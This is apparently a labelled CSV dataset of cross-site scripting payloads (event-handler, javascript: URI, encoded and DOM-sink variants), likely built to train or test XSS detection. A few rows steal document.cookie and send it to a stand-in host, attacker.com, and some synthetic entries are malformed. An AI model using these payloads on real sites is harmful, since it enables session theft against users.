payload,context,technique,severity,length,source
`><Img srC=x onMouSewHeeL=pRomPt(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
""" oNdrAgeNteR=cOnfIrm('XSS') """,attribute_escape,synthetic,medium,30,synthetic
%22 onpause=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,38,synthetic
"data:text/html,%3Cscript%3Econsole.log('XSS')%3C/script%3E",js_uri,synthetic,medium,58,synthetic
""" onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt('XSS') """,attribute_escape,synthetic,low,57,synthetic
"' %3E%3Csvg onend=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,59,synthetic
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",js_uri,none,medium,51,real
<auDio/onPlaY=cOnsOle.loG(1)>,tag_injection,synthetic,medium,29,synthetic
java	scr	ipt:alert(document.domain),js_uri,synthetic,medium,35,synthetic
"<label onmousedown=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,51,real
<source	oninput=\u0061lert(location.hash)>,tag_injection,synthetic,low,42,synthetic
<tr onpointerrawupdate=\u0061lert(location.hash)>,tag_injection,synthetic,low,49,synthetic
"<input draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</input>",tag_injection,none,medium,66,real
`><Img srC=x onGesTurEenD=cOnfIrm(loCatIon.haSh)>,attribute_escape,synthetic,medium,49,synthetic
ons&#101;l&#101;ct=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,80,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,high,193,synthetic
"location.href=""javascr	ipt:XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink,synthetic,high,98,synthetic
' %3E%3Csvg onscrollsnapchange=alert('XSS')%3E,attribute_escape,synthetic,medium,46,synthetic
"onwebkittransitionend=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
"<xmp onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</xmp>",tag_injection,none,medium,59,real
`><Img srC=x onProMptDisMisS=pRomPt(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,53,synthetic
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`AnonKryptiQuz` //>",tag_injection,comment_injection|case_variation,low,82,real
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",js_uri,none,medium,64,real
"eval(""eval(String.fromCharCode(88,83,83))"")",dom_sink,synthetic,high,43,synthetic
"<header oncut=""alert(1)"" contenteditable>AnonKryptiQuz</header>",tag_injection,none,medium,63,real
%22><img src=x onmousewheel=prompt(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
%22><img src=x ontouchmove=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,46,synthetic
"<li onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</li>",tag_injection,none,medium,57,real
"%3Cscript%3Ewindow['alert'](String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,71,synthetic
<animate/onpageshow=console.log('XSS')>,tag_injection,synthetic,medium,39,synthetic
"\"" ongestureend=confirm('XSS')//",attribute_escape,synthetic,medium,32,synthetic
"<u onmouseleave=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,44,real
"<viDeo onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83)) onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,97,synthetic
'><Img srC=x onInpUt=ConFirM(1)>,attribute_escape,synthetic,medium,32,synthetic
%3Clisting/onkeyup=alert(location.hash)%3E,tag_injection,synthetic,medium,42,synthetic
"WinDow[""cOnsOle.loG""](doCumEnt.coOkiE)",dom_sink,synthetic,high,38,synthetic
<noembed onpointerenter=alert(1) style=display:block>AnonKryptiQuz</noembed>,tag_injection,none,medium,76,real
ondrop=prompt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,44,synthetic
<listing onpointermove=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,75,real
"<content draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</content>",tag_injection,none,medium,67,real
"location.href=""javascript:alert(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink,synthetic,high,88,synthetic
""" ><svG oNenDed=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
`%3E%3Cimg src=x ontoggle=alert(document.domain)%3E,attribute_escape,synthetic,medium,51,synthetic
"location=""javascript:\u0061lert(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,71,synthetic
"	onpointerover=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,56,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=prompt(document.cookie+%27&loc=%27+location.href)>%22)",dom_sink,synthetic,high,119,synthetic
"SetIntErvAl(""XMLHtTpREquEst(doCumEnt.coOkiE)"",100)",dom_sink,synthetic,high,50,synthetic
%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E,generic,url_encoding,medium,54,real
	onpagereveal=confirm(location.hash),event_handler,synthetic,medium,36,synthetic
"""%3E%3Cimg src=x onmouseenter=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,75,synthetic
<BODY ONLOAD=javascript:alert(1)>,js_uri,case_variation,medium,33,real
<b onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</b><input value=clickme>,tag_injection,none,medium,102,real
"<script src=""data:text/javascript,alert(9252)""></script>",script_injection,none,medium,56,real
"<link onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</link>",tag_injection,none,medium,66,real
"%22><marquee onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,65,synthetic
<meta onpointerover=alert(1) style=display:block>AnonKryptiQuz</meta>,tag_injection,none,medium,69,real
"""><img src=x onpagehide=alert(document.domain)>",attribute_escape,synthetic,medium,47,synthetic
}alert(/INJECTX/);{//,generic,none,medium,21,real
__proto__[%22onpagereveal%22]=XMLHttpRequest(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,87,synthetic
"<STYLE>li {list-style-image: url(""javascript:alert('AnonKryptiQuz')"");}</STYLE><UL><LI>AnonKryptiQuz</br>",js_uri,case_variation,medium,105,real
"' ><svg onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,73,synthetic
%3Caudio src=x onplay=console.log(1)%3E,tag_injection,synthetic,medium,39,synthetic
'><ScrIpt>coNfiRm(LocAtiOn.HasH)</scRipT>,script_injection,synthetic,medium,41,synthetic
<a onmozfullscreenchange=alert(location.hash)/>,tag_injection,synthetic,medium,47,synthetic
"<script onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,71,real
onmouseenter=\u0061lert/**/('XSS'),event_handler,synthetic,low,34,synthetic
"<kbd onclick=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,43,real
<teMplAte x=Y oNseArcH=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,52,synthetic
"' %3E%3Csvg oncanplay=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,63,synthetic
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",tag_injection,none,medium,46,real
""" oNhaShcHanGe=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,55,synthetic
 ondr&#97;gov&#101;r=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,50,synthetic
%22><link oninput=alert(document.domain)>,tag_injection,synthetic,medium,41,synthetic
%22 ><svg onselect=prompt(1)>,attribute_escape,synthetic,medium,29,synthetic
\%27 onvolumechange=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,40,synthetic
onr&#101;s&#101;t=confirm&#40;'XSS'&#41;,event_handler,synthetic,low,40,synthetic
<seLecT oNanImaTioNstArt=prOmpT('XSS')>,tag_injection,synthetic,medium,39,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink,synthetic,medium,99,synthetic
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" ontransitionend=alert(1)></ul>",tag_injection,none,medium,102,real
<IMG SRC=JaVaScRiPt:alert('AnonKryptiQuz')>,js_uri,case_variation,medium,43,real
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;,generic,html_entity,low,174,real
"""><img src=x onerror=this.innerHTML=''><script>alert(document.domain)</script>"">",dom_sink,none,high,80,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",tag_injection,none,medium,105,real
""" ><svg onfocusin=console.log(location.hash)>",attribute_escape,synthetic,medium,45,synthetic
"<embed onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,71,real
OnkEydOwn=coNfiRm&#40;1&#41;,event_handler,synthetic,low,28,synthetic
%3Cform onwebkitanimationend=prompt('XSS') onwebkitanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,80,synthetic
"<script>console.log`String.fromCharCode(88,83,83)`</script>",script_injection,synthetic,high,59,synthetic
\%22 onpagehide=alert(document.domain)//,attribute_escape,synthetic,medium,40,synthetic
%3Caudio	onpopstate=confirm(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
"' onc&#97;npl&#97;y=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,69,synthetic
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%60AnonKryptiQuz%60%29%60%3E,generic,url_encoding,low,68,real
""" ><svg onvolumechange=confirm('XSS')>",attribute_escape,synthetic,medium,38,synthetic
"`><Img srC=x onCloSe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"<li draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</li>",tag_injection,none,medium,82,real
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,low,154,synthetic
"<content onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,67,real
<hr onpointermove=alert(1) style=display:block>AnonKryptiQuz</hr>,tag_injection,none,medium,65,real
""" oNanImaTioNcaNceL=cOnfIrm(loCatIon.haSh) """,attribute_escape,synthetic,medium,44,synthetic
' ><svG oNpaGehIde=prOmpT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,43,synthetic
%3Cselect	onvolumechange=console.log(1)%3E,tag_injection,synthetic,medium,42,synthetic
\' OnbLur=prOmpT('XSS')//,attribute_escape,synthetic,medium,25,synthetic
<image2 onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,46,real
<sourc&#101; oninput=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) oninput=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,105,synthetic
<script\x20>javascript:alert(8352)</script>,script_injection,none,medium,43,real
JavAscRipT:aLerT/*X*/(loCatIon.haSh),js_uri,synthetic,low,36,synthetic
"<param oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</param>",tag_injection,none,medium,73,real
"""%3E%3Csvg onpromptdismiss=alert(location.hash)%3E",tag_injection,synthetic,medium,50,synthetic
`><img src=x onpagehide=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
onreset=confirm('XSS'),event_handler,synthetic,medium,22,synthetic
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60,real
"on&#97;uxclick=confirm/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,66,synthetic
onmouseup=confirm(document.domain),event_handler,synthetic,medium,34,synthetic
' ><svG oNpoIntErmOve=alErt(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,45,synthetic
<a/href=&#74;ava%0a%0d%09script&colon;alert()>click,generic,html_entity|url_encoding,medium,51,real
<small onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"%27 onbeforetoggle=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,59,synthetic
"<font draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,66,real
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",js_uri,comment_injection|case_variation,medium,56,real
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
 onload=confirm(document.domain),event_handler,synthetic,medium,32,synthetic
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",tag_injection,none,medium,113,real
%22 ><svg onselect=console.log(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
""" ><svg onpaste=confirm('XSS')>",attribute_escape,synthetic,medium,31,synthetic
	onsubmit=confirm(1),event_handler,synthetic,medium,20,synthetic
%3Cbutton	onclick=console.log(1)%3E,tag_injection,synthetic,medium,35,synthetic
"<object draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,70,real
`><Img srC=x onTouChsTarT=cOnsOle.loG(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,55,synthetic
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,tag_injection,none,medium,82,real
"""/>""/><img src=xss onerror=alert(2)>",tag_injection,none,medium,36,real
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,65,synthetic
<mtext onended=confirm(document.domain)/>,tag_injection,synthetic,medium,41,synthetic
<tr onPoiNteRraWupDatE=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,44,synthetic
' %3E%3Csvg onfocus=alert(1)%3E,attribute_escape,synthetic,medium,31,synthetic
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(bToa(doCumEnt.coOkiE))>"")",dom_sink,synthetic,high,66,synthetic
' ><svg onkeypress=\u0061lert(1)>,attribute_escape,synthetic,low,33,synthetic
""" onfocus=alert(document.domain) autofocus=""",attribute_escape,synthetic,medium,44,synthetic
<li contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
"<xmp onfocusout=prompt(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,high,55,synthetic
onwheel=javascript:console.log(document.domain),event_handler,synthetic,medium,47,synthetic
"<style>@keyframes x{}</style><input style=""animation-name:x"" onwebkitanimationend=""alert(1)""></input>",tag_injection,none,medium,101,real
"""><img src=x onw&#97;iting=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,60,synthetic
"<figcaption onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",tag_injection,none,medium,78,real
"\"" OnaNimAtiOneNd=AleRt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,56,synthetic
{{[].pop.constructor(%27alert(%27XSS%27)%27)()}},template_injection,synthetic,medium,48,synthetic
<track onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
""" ><svG oNreSet=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
`><img src=x onanimationiteration=console.log(document.domain)>,attribute_escape,synthetic,medium,63,synthetic
"document.querySelector(""body"").innerHTML+=""\u0061lert(btoa(document.cookie))""",dom_sink,synthetic,high,77,synthetic
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionstart=alert(1)></style>",tag_injection,none,medium,110,real
' ><svg onpagereveal=console.log(1)>,attribute_escape,synthetic,medium,36,synthetic
<script src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,94,synthetic
"<rp onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",tag_injection,none,medium,57,real
&quot; onbeforematch=\u0061lert('XSS') x=&quot;,attribute_escape,synthetic,low,47,synthetic
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dfn>",tag_injection,none,medium,97,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,low,111,synthetic
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable style=display:block>drop here</iframe>",tag_injection,none,medium,133,real
"' oNprOmpTdiSmiSs=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape,synthetic,high,57,synthetic
'><img src=x onb&#101;for&#101;copy=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,66,synthetic
'><img src=x onmousewheel=alert(location.hash)>,attribute_escape,synthetic,medium,47,synthetic
<script>/*/alert(location.hash)</script>,script_injection,synthetic,medium,40,synthetic
%27><img src=x onmousedown=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,50,synthetic
"<br onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</br>",tag_injection,none,medium,63,real
"<legend draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,70,real
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></tfoot>",tag_injection,none,medium,103,real
"\"" OnpAgeSwaP=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
"document.querySelector(""body"").innerHTML+=""confirm('XSS')""",dom_sink,synthetic,high,58,synthetic
"%22 ><svg onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,69,synthetic
"<b draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,80,real
<track onpointerout=alert(1) style=display:block>AnonKryptiQuz</track>,tag_injection,none,medium,70,real
	onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler,synthetic,medium,51,synthetic
"%22 onpaste=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,54,synthetic
<b <script>alert(1)</script>0,script_injection,none,medium,29,real
"<img src=x onerror=\x11""javascript:alert(1156)"">",js_uri,none,medium,48,real
%22><table oncopy=confirm(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
%22><object onbeforepaste=confirm(document.domain)>,tag_injection,synthetic,medium,51,synthetic
<svg onbeforecopy=prompt(document.domain) onbeforecopy=prompt(document.domain)>,tag_injection,synthetic,medium,79,synthetic
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",attribute_escape,none,medium,57,real
